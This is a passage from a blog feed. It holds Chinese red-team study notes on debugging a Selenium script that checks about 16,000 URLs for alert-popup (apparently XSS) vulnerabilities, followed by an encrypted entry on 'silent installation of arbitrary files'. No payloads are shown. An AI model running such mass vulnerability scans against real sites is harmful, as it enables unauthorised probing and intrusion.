刚才那个&#x3D;&#x3D;back控件&#x3D;&#x3D;也一样<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261859225.png" alt="image-20220926185937158"></p><p>但是发现直接访问还是可以的<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261904735.png" alt="image-20220926190445661"></p><p>感觉一下原因  没有continue 但是页面出来了 说明肯定没有执行到我们的XPATH<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261906337.png" alt="image-20220926190617293"></p><p>应该是在这段出现了问题   能够访问url 说明get没有问题   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wait = WebDriverWait(bo,<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>但是有一点是 自动化里访问的url是空白的。。直接访问却能够访问</p><p>我总觉得这个可能是最关键的原因<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261908729.png" alt="image-20220926190829667"></p><p>&#x3D;&#x3D;有个想法 要不要每次get(url)之后 refresh刷新一下&#x3D;&#x3D;</p><p>我们对比一下urls.txt 扩充一下原因</p><p>发现还是没什么异常 遇到get不到的 就会continue get到的 就去执行之后的东西</p><p>几次查看 也终于遇到之前那个clart问题了  <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261925336.png" alt="image-20220926192553218">   </p><p>&#x3D;&#x3D;它会卡在这个地方卡一会  并且这个alert弹窗不会关掉&#x3D;&#x3D;   然后直接traceback错误  然后直接显示“有洞”</p><p>最后会直接这个url关掉 前往下一个url  而下一个url的特征是超时载入不进去的<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261930385.png" alt="image-20220926193029336"></p><p>仔细想想  alert弹窗没有关掉 且显示有洞 这真不是跳到了我们的<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261937139.png" alt="image-20220926193713088"></p><p>这块代码里面了吗</p><p>所以说这里的result是否  就是所没有判断出又alert出来</p><p>那我们可以做一个简单的无所谓的方法 就算有洞的话也会result.accpt() 防止影响下一次任务</p><p>还有个就是sleep延迟大一点？   防止印象EC.alert_is_present没有检测出来<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261942922.png" alt="image-20220926194239829"></p><p>我写的时候我也感觉不对  如果EC.alert_is_present检测不到 我们后面的result.accept不也检测不到？ 果然发生了这种东西 又找不到result 而且弹窗也关不掉   我们把这个aceept删掉再看看 这个问题的根本原因在哪&#x3D;&#x3D;(为什么获取不到alert&#x3D;&#x3D;)</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261947530.png" alt="image-20220926194725423"></p><p>这次直接给老子geturl后不输入账号密码了<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209261956350.png" alt="image-20220926195649248"></p><p>后面又测了几次 要么是直接get不到alert 要么是直接空白     sleep0.3 （很好用）</p><p>感觉可以在EC.alert_is_present做个一样的 在之后的if做个双重验证  （alert出错是小概率1&#x2F;50）</p><p>&#x3D;&#x3D;直接显示等待&#x3D;&#x3D;</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c#">wait = WebDriverWait(bo, <span class="hljs-number">3</span>)<br><br>result = wait.until(EC.alert_is_present())<br></code></pre></td></tr></table></figure><p>Webdriver这种方法叫做<strong>显示等待</strong>，用一个默认频率不停的刷新（默认是0.5s），检测当前页面元素是否存在，如果超过3秒则抛出TimeOut。 </p><p>比sleep效率高很多</p><p>但是后面测试不能直接赋值给result 这样的话会导致一直在执行  导致<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209262032799.png" alt="image-20220926203258719"></p><p>我们可以直到wait.until(EC.alert_is_present())，应该都会出来   还是不行  使用try expect应该有方法  但是实在不想管这个了  越改bug越多:anger:</p><p>还有就是 在空白的时候（这个1&#x2F;10） 做个if指令使之back到上一个url或者当前 然后就会自动继续执行下面的步骤了</p><p>空白的时候是什么时候呢？ 要怎么给它操作呢？ 我的建议是都不管 全挂后台 总共16000个url 手动修改30多次就行 成功率还是很高的</p><p>当然我还是想改的:sob:</p><p>去百度一下吧</p><p>百度不到   欧耶:sob:</p>]]></content>
    
    
    <categories>
      
      <category>红队 python 开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实现任意文件静默安装研究</title>
    <link href="/%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85%E7%A0%94%E7%A9%B6.html"/>
    <url>/%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85%E7%A0%94%E7%A9%B6.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="62495d3e35912ccb383b1d4546f9363da7f46871acf087326de5aa2e77ec3687">7d86b79689ab60361a9356d67b6bbcd5d4825af2d8b9336d7bf55628ebdb988e8930a6cdfa6a3aef2a689d43cb8d524a95ad7ea9d68cadfc0114353a30a149c8f2138a17cfaebfcb67f864254b23857daa7fb6c649da0ece1e4219b121c6d636807972fc30baf85508bf5728b630fdd6979b7e5b871a81e6073942f1217edef435ec2fe874b57c2fbe88ce1b55352f0def9246353d5951d81fea02a5b03fe49f9c0e687db922baaeca72ba37eee16cd7705d4ce6fef165d216e43bda36bfe1d604dd2787be50dd27fa85b639e539f6b86fc97ab4af2d2ab4342e1da4c5b707e03498cd089d97f04dee265ce74a43109b3fa68dd8e8fa868190a908f4416e1aa7f153fad60b61bbfb1cdf52d58f0207ed161191fbbdc2aa0cd870ec4857b473c65b74dd50ce55c19bb0718ddc3a31d5c52ca99b0f7a7abbb230af46ab219dc8fa5200be876edeb54f8742685e6500ee141998feeaeca6a24fff8e33a88c1fdcb7592d85d9a733d0b825f17614e1e21a76cbc73e980b6d0809c7fa5b9f53ddac4af47a1efec7994b6e69aff454b6ec9e96a93088b6c9c112a41fba726c1819d8e8befe6b530307025ff35c2ecadb6fa8d211c801a577c8e667b0a1f1dc5635524df492bb73c0165baf1850283ced41ac5e22d7be38a258ba72dbe8655545c935fbf65f06e3e93f13a4b36f270a97aaeea1cb68a81fcedcd6e1817c51e429f344462e4d61f260beaacd747e7eb6f31b8034dbc0fedf76a0a981a22b9aa3266e00b1684b91a839b892f7ad200abc6fdb58929cf8ae11ff4a108de346708247db2705b2f7fa96d3cb0b153abdaddcf9de77732068516afae114907ae84ffa8496480c9b1937b6165d3bd6094c518c4409711dea2be9e51681ce400afff7f97708620a1bc57ea0343e2da24735fdb75a37cafa21029d46094a75226a3139adc0cf4c67b70053292da44cb18f00beb8a18c1ddc2fe8390f710a2740bb6c27009c20c5d3bc6a156a5f732f4a745b73d80e3d44d21735f76f3fe338618af42e094d946f62ec29776003b23eacbf35273751f4b3e5f9fa7e3c8c9a4d70b27cb37d7953705c79b81f846a9cc5d664d4fe56d2cdeddf58cb38f85219b2b7390aa4baf4bd36002d767be5748811affb61da57d143bf36fc9010531ce8f4ba0c126a0d8078be95517bab10336f29c7f9c03b8b1a5196d266bd04b9fb5384b6ff89115b4afee10117aa7f54758eef591bbc279f896fc7519e17a671db244d584c44012c316b8c70e063f0c1c9b0107095eb054df428af8ad32723144b4434b3b7fc4dec007e99fd43becaf316b72e594bf4c14b047a780c4e4ad40fd37a930679c6bee61220a7ebfc4bc0b4160bd0e1281df5f6556028b6978e370df93d6815bb783ba7e2290d3e1c5b3a038fb949f0d015f4e5f04d32419511cfc44946cf4e8ec99c98c6a5716a981acfe33dbcb35d1432af9dac626e70b081901ed9177c692b2a0f92a3baab6d64caac43fd045ca9f35c24d5631faf95749ed58d0f7182fb679ac23c2119b68c3118ca11406cc52cf8120500fdfd426707d41e08db26160094f0a65938124b26b8f0184de5c7834d6ed1895bf1d510d0fc327df5b7eb47959e38e29184a1ee248e44b685caac4abb692ba8380da3415a1f716b64df03c80b72f93bbfc40672368beacd5bc1157204de3606921e71abd79cf83982a50085e93d33a5ff1f2908911733e751d84982564f0ce4aeba30d8eff379fa760e6b30575885a05f025a13c1f871eda6f97866102420402cc33cc17061d4f682107a51777deb691729a7e6ba59a33848ca62494d27c6fc6ec537a8e6b562b4ec09b0cbe864ba40882a810024841ef7d2e991cbe68c2116025baa3e915222597af3fbd8dc5d968449beecf1cbf7c7e44c026a2b4a598b0d4d5d6ce9e077849b4e17dea010787b04eb4541021619b58ac44e469aa98c4a837cd2909a9837313fe2de09ac617386b736b80a33af9c25c1fef3a74bfa4c48eecf9a1481feee34df9daf3cd3d791da00461e016de631c729136c1b3282a6ab1ac3f48673ab4722db78036bb0a26b8d8136217f45dc9ceefb47896fc8a53d61b630457bb738e6d8152addecb02c79862d0403331c7bb477e4919d9644264eedef1342be157847ce180dfa73aff1cd8617e1f5f4fbc4c7ec62ca5e7cd5f13e84e5c29d4eecfdd5d811ddadd587e793c67600df9b6263d227280d25e7da5059a5ddc16e9c0b66d56b1d7af8ed513b02465f2bc8547c5ce557b6c58a837de7542d55a5e735b48b6b722b6aecffe972b806259a0aad76fadce266057e1c3306a8c8aabcdfd84a4afa1805111686e867e7c1e88d3c194c8ad036f3fb92a741a9efea1bfd19b0d93b050b76c23ef2792a0a0e2a2a57d4053280690a1b7e567275adb53c639ac192aa49c5a27cd9015b58c6691749b58f11c635a880158ab5c98dc6e60f9e4dc20f9ce586cd389317c42dfec6b6f70f6be897c8c0e77cb2218680476b38416c76c0409d96bb26b52fa5f3dc9e18087fbea8fe15bd973349b034ab8ec2a2c12d30f0ef813f53ee9143187aabf4306ee52eb0d9013332878a275ab9bcb7dc1cfa44149b6c0ab558f293575f0fb2a92d6d02297b72554cde890b8007a330a27ec266c4c55d76d8ff209684536b2c52eb897a6bc51b96e2e7e14974318dc0fab9acfe6510ac5f5015e522489ae8e30698547ec2a929111de9e0ca0e39e2885a1e252985063b42ac56d69eb70636119e559fddf13d0cecb4473a327c633b44dcadf0fb20f3b8ca58fd66fe10d471953f86a5afe289fc7eb3a962a530fd83fd9e10ad8902d6b8e30c61c19ac86704a7e531c471f42891faa720ec96f266f94703e6b7345b7673305133ec044f69dac68dbcd1d8fb01a029f54bbf1800c69d21a697cd9d794ef93b2680ff7ffb46192216652f0542b05ac53e1d140785e4cbdcb9420e0b80655ee2c619246cc74b6300b27b2295e09e84d6c3f48485be9ed9b228839f1d8b34589bd8f6d39022334c74df075ee306e199ea76fb58f85d4b7b7160d901debaad4f07b5553cee651b6b12134ce87f0364e32e531cfff566f1ee8fd1edcc3e24f63ad9e9ee31d276b3756860c5e72dd4db5d398bf717a9ff3c075792aca763b340dd71fe63f26dd5dc9b65a1fb31d76ac70ad47df69b97994fa7fa5497ff700d84d1138a91d23145ab10dfadf58aa13640b61928f01677a634c02e035ec2ec81c3be06aaddba10cb899455ce2618dfa0bd48a044fd99dce3abef4dc9fe8ddf94d6376d7adabc198b5f51f9155d27565a6da14dc80a6109fcba53947cf5cbdee370987c3563b47f84f7d1c5dccfa77fe619ae2be69129543ec77cdaa4775b7f7d4e4bf2efc7ae2fd4ded3873d0f637600df3e86ade191274e78706886081961b9fab701300f157e041df9d1cc9e011adb3fb935fe2e8cf9c84a5a4d6cc7e39f7a1d23414f1e14bb592c5f8634086b12439502d014a9f0f2aa9f30680240f553724ee5a14ec301b97b6a07374fbecb98f239082d3a05237c8039242be98f4eac356a6314c77a322eea0fed29188cdedb04e72a65a15565bf6680a1d9a20cb6d7ebfb9e6381a85ea6677ab4ae5c0a567f1ef4064628fa2f246a9825f885a3c9a2a9955cf687a6258e041e76a2d3f8c959a85a214e1dcb227366327075f4b8cff77e4fbc346908c2cfe917335f226a9d787875883b9d41e3a5d3cd4dbefcc071666961da97f31b9631146d413c31370820716d4fc7086f10a50c03eeb016f524a33cb9710f1fdc316ea32559fb7ef26e76848b14322040bb700247a0b015073c5fb0456062f8471384d9b4b0b7c7b7fe1ff78a165db7d75ba477b59d628aecb6b12ea8598cbf81f497974bfd64e9c3e752229334e6680c5bc0f2d0db2ba49ee89a7911d2540d10bbb504f2a02544abadee4bdb5318b9b7d026b67210610218dcef24b67aef3ec998f8fb526f7b7ecf67e245a6d4eff99043dc584a1dd76ccbff9c025d82adb3de148bd69a7cb6ca7ea3bede293804caf5cc9d5885fba4234dc91112ebfe0040a23d2170c950faf2ff04959af1f20fdb42711c3d44b7719d356e4976bb957c29fcc9d25cb7829d33c97f150011dff046445e25bfa4d65ab777aebf7bdc04206a527e5446fa80424a8dcfde92d5693daedcbd8880f615a5eafc0205c1ef6792101afdc188bcb74e0fe78605f3dde7b75927db99781f9a4c8ac5fe3b47968aebd91994a7de3e0c41386d98fd29d97641886cc9c277187f95d9def678708c448e475bda3c782490f0664c94c438a4f2b01a01e88f4a8f5ac8f30e081149fb22beb922546b2e6a826ccd249582eaf7cfcafa2bb4cd67ccc9c98b1947e40305ab0db6c50c35204f11acf6adcfdf1b6a532a3c29167cbc8a2990e84e45bc2e00b21e348a31c70cb4f534ec9af405085fd75af8a2c374b47fee79f68146e49e656a156e808c17d98937226f1bb4749b7a8fbbf9face57399db6ee7b60cfe34ce5c62798c6f327ed634d583d911165a85bf09c372abb64bbdc09894ea2ff0f7568a7941db469e62c4e781d31079e272a2d74860436589261f43c948d5e7e890ade5005e2e88a2fa50b9971ce6ec75c4c34be72dfc7e4a03c8063f85cde98b0e9559c56d8a003664360b67ab64ff279bf4e078e9992a423055789390879d475601827860901860d930b8a69475dae9de3ed7a9e9e9ff13414c13a7c43fbeb01f7b12044862aad67f5441e45b32aa4186ddf2758618ced34ed8e0e3ce196f23b5302f415236a65bd79b84e85b250379ec2a338d82c72ca81ef0185678c28ca965023d955ade106267ea2282af1ad75d4bf7f2d8b0cd8b105935494c4da47a86a915f4959468cd06e9a1e43aefedf3de71032660d46983da5073c7e099e550556e8c16211d0c316b2d424743c4ec6018604329f55005e062008720ca2e9bb705c48207a75be8577d7bcc6b7482ca70e951d52276269273a9f7e0f82191f3999d0d8f8a3f89f40adbbc288b85ac01b27c434f10709e7159f556a51a0f25d5420bf92e3724f29fedb66b4bf7478b6ba9bf6d134f0d8033116d807755b47d33feae050a90528a0d06f02105b9257a71123a3819bf17862099aaa2cacd26f68b289df0e969756c637411d13e92a567ec817c2b4451a8ac96c093173c3f0f125189f3384ec645bc734c7e3b29c3bd3cacd7a51b6f5a11a4fb201d4c94cde15b2e2f4bdb27a091e00fce00909549478f13b6c8a3a66001240268c3340544d169424d78a58e8cbbd7bcce70b4a3bbb47ee400f70ebee9103709c59bc0834c1f92a07e4a4334b6c15646fbfa7249e0e0b0bcbb3c79b3842e27b87c5c00e1ceec34509c2aac84c9dc4d6522bf8ad7d1406ae96ee6021ef657aeeb45fb90285a5a75b11dc07502bbfa87b9f7522c7997922a07b4a5adb2f6a65e5131e38b21ff522b51f3e1895f6ad3cb0e2a65b35e0545327aed3eaec731b3b49e00f86daef643631007f458d67c123366a94ec93cf7b10156edfdc613921404e0937e349ad61224cd47f6f12635c6566f3a66603b54f21f74de2b7133e1382e0155a6b8ceec1591ae6085d0f7281a8730f48eaded2c0481e8e63da05a37d78a076143fac68c1334d1d2c99982a23be2dae03e19553a5960b116ab984e4737e96a85e3b574d05c1213b423189dfdcb5a2166609b512080088d047ced3d74d9a80bd7615b0d9709b07d043babb089722e62df41a3085b9fafc6c972f7e303a23efb67ca95ee945471ed389493dae8f16525ef46b2756cb0c6c127091e8637a77b79a98b3ae78cdc510d7bd43a052978b26352fc2a43e24a2950b4b378f07e6a6a61fb9d11a9853940c41985d202d5c0aedc1ecd4407b7eaa712c4f67b577f9681e99c155baaba98f7677adf773ccabd7cff5837fe8e5f1e8b0cb8c86460d3df9bf1c8168dc20cbb4f757c504779ce6e04b2d9cb9feec8cb89e646d68a58099153a12263e2cc2da7643160e3c372794d6121ea54500548fef0a33094de2eb59efef0878593b999a83c790fb5fba36bcc0469db813d87af3477ce1145da19cdb22c82cda404edebd208caf2b2220c8c43d12be1cf1d1becf7203608eab532772e73bd70be859430d136aa8431248df080f07c4e4d2f2ef6440321cfa9c9d133d4cf266e9d7595d79f120a5f6bce7b8877e23f7d39c36f3fef14838d12163a222ff7961f33de3048d56d73f62c796afe2cbebe060276c85a03832df6fc0c625fda2fb111cfc815d910dd133aaafb829aae38e2850d83133b430691cc1082fb752041db33446072a5c1609585a0952eb7ec0b5197c6180a4d2b31de9c926c2687836dee81a53056a3d29c54b5218ecbe226d609d97c27220b2d3e9131bc0097cac63d66ad4e8c0e1bc75d363680fdb22504a09c32e167252801650dc9052b345c91813a433af7e7f567029e2ce5224024f63c7c754a47ce726c31ebbbfde1d22a37e0701a7d5b78056ad676911a707cfe412957cb7c3f6ac214ccc71768d5432ecd91d2f61ea10a701811fc55c226a8e7241e2a9a6e686bfb92f6f7088eb1163a86b93b1dca939779cc240e8b968be33906e7d2a91d6164806283f139ceb12e45b5e9541806cb4dd18da40f894ee9292901841395aafc1b12d69ea49b3140f86c9fbb1c4bbc6225469be1dd0be6cd37a21d6b01d3ab77c53dbeba549bb59f79347ddb667d932a498788eefc9097be6acae96d33752c80cbf7d87fe08b69ddfc9282c05fb4d6b4259159fe800dc251857e067c3ecde040f69422ea73f6e6343e7fcc64780cc0de869d44cef6b06343c444d7447844200e24d54f475e8a4bf97f7e388cdaf0d1a82706857c1e690aac5c19e4bbc47ab9760c38cabdddd1d71f9768601414b040b00f69f0c2b095821f2a1bef5c063797869fc86b10c7f520b00def8b4634c2a27586303fcfb82c07227b65d05b35ab913f6d795b0f11ce354479b06e498ba814cff2e417bdbc0177b9d3efb4d1db2777e29583ffed71ca5ce162f236ee60a42222041e8c6b6a54312218654e732ce15cdf7d2753d18ffa1deade1ff907cdf546626432111caaf24f597db65a9b263874bb8664b1c102428a04ce6dd7bedb87623772888f9f339a09d01a53238b05db17a2782bdd58628cf96443ed390c36b83db2dc3dc6fef35e9e4b37d7e04a3ab6ab38b009e515c2ee635d8bc71b0936f2c9e1772c8ad9651c543d944db570b0a836e408ab246d444c09ef1d2cabad0ab489e16dde15a34bed7b9960d80769d3512a6d8027aab61b9d0a070d50332f893b5c697523cfe323f3184ba927176d697a7f856482abf5132588d0e649c2d1deadc975fd7fb1733e838184fc3d9ca8ceb502609f3a2d81eb6dcf66ea95d74e6c0d59b02b4cb6b6dfab646ff7920e4a56aa8be6b6d38ed82ce9ce4ba21cfd360f54d9de80dbd0575169c48cae0cedafaebde249259121ed07f8e296fb5b21d083fb56f124adb4eff92939f9175b3abfb40eef335254937d4b141fa429eac66e752ae48006f6276b6d394b49087c56456c76aa4fc9364e58b42146935109e4673cf3aa45e134ebacf52e38add1ebecd31b00456101b18b085252669200d39134dd46cc2f5c1846658fd26d15ded5ae1444bdd4524e53eeaca9bc5938ce5e620e8c4a2117271eebe6eca7f202eb74973fe8e4fbdf3b6cf3eae916d64f38fa51a29eb28b45babd8e0d21346a9ab79cd8182e09c48b398131ff2f8b1c7d9dca44f2fe06549e9484ef55d878555c9ab2bb8dec391c8f7422021c6d19de28ac452f046d98c06a809b87e7398ddea59f502c1b221a27885597e76a71489c52b5c27c7103aab7e6696172da7f096d67cb1d58e287f7101a0770610dfde5e72231ae70d3b6fff55d4baf18dbb260d08f637b1b4cd8a56442d57ee8a3f2b4d3d0573c2f607ffa4aa564db473579e0ed4d4c910fd529cc1b64b0c0fa8312580bb127a1655687ba6765a72abe021b58fe7ebe1868148efcc543a8d1cd296691d9d8001b7498834f39359ac2f2f69afd2fe44a79712e829e0c26ac751a628e584176e871a91650f6dcaa10d22845c15131784a5c40e88931cfef2490026fe65448fc92dfd8e11e5bbabaccb59de71d8ab5307043557153ebb10672b74b7dea3507dcb2dc2309023ba2939bb9daa2e1f0745a4edb973428ff7f723a8c86ea3a08855819e60f1c1a144f6b16013c5999c0156f8f7ae6fd8ffc29bed5f02915af4ae19738c0688c3ca18f6afba6a4c607af5a208fdbf7a3658b7a1bbc48c37ff73df13629af489653019b17907b45c03b082b2b63c70a50b4c9c4ca384a40ef532a083835e40bebcf40b62202f01df1e5fc18188e2722892ba5caf0a0802548b6fff83f72a9b3b334164440c537d89350d578d37f7ed44d452303d0a8ca87f5f287b62e9e8e4fd3389eef2a71114ec3e2933d3fd6144cb21d5a03b5acc90ee7fb6b3e3f23fe2c1b135b94156ebcb70ecbe9615a4f1ecb4199fbb88e10481c9e70f2b7e3ca1fb6aa1cf65c084a1c61434114ef67a6749405c53f22177babb106e1950c41d4c7eca4f7524254b9b3deff837425269dba752940be8e69453ba28892c9f81e70c72519b15125193d1354b5b6180e60a38b68455ec183cf1f8a2990cad1f786b3140629308a00b0840ad363d1e8156c9a533772a673cd6dcadfa7bb1a16d6b9cb8495826a550db48a84a9f85199270701165fd4540985fe8d10e8de83717d145eb9af3047cd607ce10872bed712438f254b3d6e23c62a8ec578e96923b4772821e72a98f836f2d31e578ae5423c799836b66bd3ddaf4ba1e1b3d0a1cccb4539e42a2518913458c58796c0b740a5b467796b2ab9243b335a15f6eb644394080162c907e1bdfb08473b76b49813ead3a7e7427106182ff47c0ce62c09fe8f74eedc3c9bf4304b40d59ab04f5d1f1291f015549bcc11c6c36a31f6a4440219c6dd7833033c787122225e75231175ad5aca0011bd90e90084e17bd7c5cd3b0920c7b21912012a14c52f13c8ca00365cf2e38fff6808012ed5f4c996152be7ddf75acbfc47810c7bdd8bcec2b34f005d2ea62542cdaffc291ef1638c02d79b13d0d2640645571f56a2e5500c3c3d58fbe39377bd5bbb79e3546e03a65339d902242f20f8b3e2861334a74bf4227eabd38bb7733954b7a526f24d03d1de42575cb900efcf20c041c7afdea870f866e04f3bbeb2d06a09aaa10301516c01a81c513f5c4308d2d8522c20f6ffad55063437ea712162a0852be24a4a8a3b0f9b841a647c16908ba987682ebf1bc4a55ae6d383570484cdf5df9d15efb012899c4fb3b086eae5fd73ed594eb7ca92b38c4910f160699ec26679749eb8ef2518443958306bbe6f0222e8cdbaf19b3f598e6e83748fd94adfbc313da0b0b1d6496a48630fa1d081d83c6b457b97841db7d59171a72c26007e57b79840e8de52019dafee9a8349b2ed027d1941e4b972fe3c6fe72cefe8d54e1a932dea5e8d85d8af27a249b6eeec216e7ce12e67697f4d3261db0bf6805badc75819c7856d71b75043b69ba76b409f54f41bce74b259e2c3ff219eaf26bb3879c7ccc3582e2a43425db91775132eb64c940803049c5086c2ac0f19cc4d0c923ea40cbc9b975e3027d1699820cfd608d2b76c4a2e1fb619a2add56f7c34b74946f605b4e449c33d4f0e241ec4eb8e28c22388af3cc5bea1c61d566b519beb05e31b2eed69b8e36ef5b9ca01e64d860cef0472ff67b5bc41b8414f4be03e632db6316ac549d14c7d899170c5730368bbecdf717d9609e4542071ba4f8fa59c4623cd20c4b6d7c9bd4cd4fdb64a46a2ea06a290f0b295e74c8c82abce4dc2c975a88947b6f46920ed77a587fe71e6ffc2436a6333f86955bbbd6387ff2aa63536e47dcd83cfd543d8d4a79eb72e9c58287d648d0776cfbb6c766cc7dac889729b667dc8a59bb2aa0d2c3d4e4d960599cc915cd7546b96fbc7be210e8a947ad3fcb08d25d1ef82fe490ae78080679cdde2292d18bdbf7adaef85a79ef88a03d4b44dd89b1b6d6d6e1627142492ef111006377dc70049aab949ee6f93afa304bb6e423e5e74a474734e76a545cf7e8d682f60d63ad2cbf5ee969228ed1f4fa9104178b7856d0cba7a4946b00638c6d1fa8767fa19b9f5b8d93f8208348c6774be5928cf20ce89e5574a91f5c14292ec45dbc976066677facf96c0d50824688427c3d787478e54afc4e0017fbcfe3c1c76e110eb00fcc8ccb09e67338c0a8f0a475e6b841125dcf5e64e3a069ab7c7baad28687cc1fd0ddadb33f4e78306d54e1d8fa08869c4f7eadbce69691e3ee24035084fc1f913b1847cac27e4fa66627d7ff65e2d7e57614c06fbec46fc5be9bc231fcf83c84ea959f3f96cd4a70b66ebbf224c7d2c42b83f29edd46bf2a913350ad7dd01d3a60cc8e5280cb471c2eb77e41a565c02640269548babfbd19a003d997fdf147a42d328ca0b0634560bc98edbc40016fa3521be08ecc988e74f7e44b8059e6c0cd097c6c0cd6eab17da7adbadbe0135a5ae0a8f52494711677d2c070d5904230a2545ceb9bd902d839f69f09bfe9876292374174fa0ab68f0203bc8af988fca97dfaaa4b6fb5d74fb3371341ffbd0c44c0b3d5adaedca303845cedf51c69edcdddde23552f2d5f73343af498573bf503d09bc5326f8497a68b334a6f5e8c4462d9846ff91ae0c49758e9bac2e439895bb8755a25f3133bfe6b7ef7617c215951e6e0e6d5514ec114298fcf97c9a79ef7ee7578b9df10ef9a89dbd2ca2d7fb1c704f1fda8e325f9291dbcfc3b1da65b125934eb3df70955f3771742bdb670b42ebd0e26782fe456b95b816e351046293f6063ed4e04a6eb09cdb5f0fa079a5bd6a84456d8cf731822ebf9369d9956864323fc594e35fb428cadf9ad11c08ce2fed7466ec2abd331caa57fcde54469c0584a9b662c37ca971114cb950151cc4b2312857f7bdc84a2ab526218aa6a114de0510301f71695907e4042437d46627f9d619506a04bb8abc9b8b6c606fd803d69ac817dd53d2aa4d19acd4d14320db8cf38563642c65cd8335d58a52b18c4a664eb645721fba69e68fffb3ec175fd3fe1de5befbcf4e05d265d3bfb2986c2c0543259b85a7933ea889f77cd8f2ef0adf3ea8aad59082a6959a5200f63225595a37c55b1f9363b6b2798ff60fc4cf0a2b35b07ce8f58c72308cb80eb20094b1f27e2df9f5be3ab9417e7705e7b811b63c5131793259f26612c4159137169c4f43940d832e8c825cc63e9a5f14ec02d449867bf0d29cd368b5339bc2a8418719edd933e2c2d6aa9de1ef815d068249f619ab48ab1cdce98dbc9e37754f9a47afe0a5d1b8ab835147c4e794f8e6600a019c6bed7972192cbbb12e68ebec57b5ac066d35554b79c30001134bcef26542c75f06b89f73115eb7431a8d953c831af3946f347fc360be085188a47266a8e89408bd6571507c4bf0932b14eb31406084f7755982aa9091d0139a79d1cc8940e35a9407b291a32a4dd82696515fd47935cf8e6e4e63332dd3d0d12295eb436c1911fed0fc5ca97d674bfdf41dbcace111492ad91eaf0404c5ab9e2abf5826094c32d2f3abc09d21e1eb15bd245cc8eedde9799f2534895e580393dcaff11830ec9fd885bcf8fa0520d752cf1ba1ca6a194c26b0cb8f380bd4603177f0e2c2492984201ef0270568fe29e1c85d0ab37ff39db3730b08030afafdfc5c2b4c1550d5bc18b1d5dce96a692a530442b0d3240e9dce6833322b36658ed144107bfa63d17cde58cb5072818d1dd0b04b684a5c0f6df9b7bafe7bcdfa29e9e34abb2a7bdba87065fd95e9ebd48e37f98219df6ff3f1dec9d8e8b9af0b4723267d37d0d922bfdf974e650268d657534319c31ccffd4098da7100f85e911f46ad355a149b824232e33562b7e1933fffb5e2a15e74462663746e2de6505cca8a354a671150f47854b79e1c57a88024148c1e3e20b57153e75e55b6a61d2cbb5549de5126934b7a8ea29cba2a6834a2760198d0ec8392dc13e881fa074c5c303077d3881c3cc23159b2d3a94c3588433a9720c455f46f9d00ec12c18b282091b218b7a205e773042f8297d5a9a391b803d8043f5176836afcc708659e7c53652abfa68bcd6d103c21f9708cfac6eab72a168bbc3e81e971282c62fa263bdefed6c4b669fff967802cd8a7696ce93b4fc7d09a5f2401f8cabf1243f7ef36c6e9ac73877c779156d7a50532a62083199b2a34a370e2c27c6cb39efdf2f72cc27cbc28f25e89460323019f63715512de6e21de97eafe9008fd56238c63fad08087c7cb70afdf26cc28330a833a199b3efc3123957712d3105863e2c9d0b59e4f042b325552d75a9313a26d4e8fc0027f1690b887ff3de5cda0d943f489ace5a6bfd748c1e95f50e297c33b7e5e4de4dbf082acc65ceee0a658efa47caca8a12eaab35c324a1afff17af1deb1de4406b9d2cd4e378bcaa875f1bae80d8bc6aa1e0bad05eadccf092dfcef606ac42ec78cc97b70ecdce899021c82b904a9aa9c6542ee3ef06b722719145fce9c4342e1dede77fa4c7023ddf6e3441343da9182f25767dc9e75efed37b468c9000fec1c6ffb9abf5f0663805d26fede70b444ada76840dc14043a743d7b292d6846b8390e6ccad6fe8f2b3c5bcdc8970bc83a9ebc8959ba556420ad47299241db6e0cc10219a1771426204d8cc7c280091752c881276d7bf932efde85b70b110f003d3cefd9793351ac0cc1aff06ddf16f168f4db13ee16487dfb8fff1476d5dd51dce38e34003fd2a05938de68b8482c9b243f51b72821b5622ad3fb7cd00f40d18517bcfb576f3ffc6903053198138d573eac73edc83f6736cdb7efa008b4e947cc651785b9a3f693b9735aadf556603328fbfb607a16dfbcd8d1fa3929ef1b758376cd6892a833b7ed83e93e5f711745cb244234e656c22a10734699eb657c393e39a6ff37e328ba3b3bd418336761866c5fda044ce892692ce94394de399d396b3a1696f8f50c23cfdcac575928c301f2cdfc3fe3f536ae4afe94418ae6753d7bba9248c4e83c8d1d09233568188fd4bcd3e5dc84e46aaf8862ce671869a2908f42a991f2131cfe0775489f731479d47e97c3665b6023ca4bf6f2b2bc8dbcb31706e61f197634829d8464049e737cda7bd272237bbd3bd1e585ab726a31124079d023e38005aca53301243c2d6f408cc3bf840e6ee0031ac7e77f198c5a5ac2e94984794e1d8cf72b162ed9a4e602b6c9812b3851881fb12146263994ac6d5232950e85ee134fa9b0ac99cd7e853162294948b89776b93f4f1cc4add043817c6b1da5d8e6560c8266cf4eea9a8946e89ba3f6ead26dbb0c59b13ebb52eeab6787fe84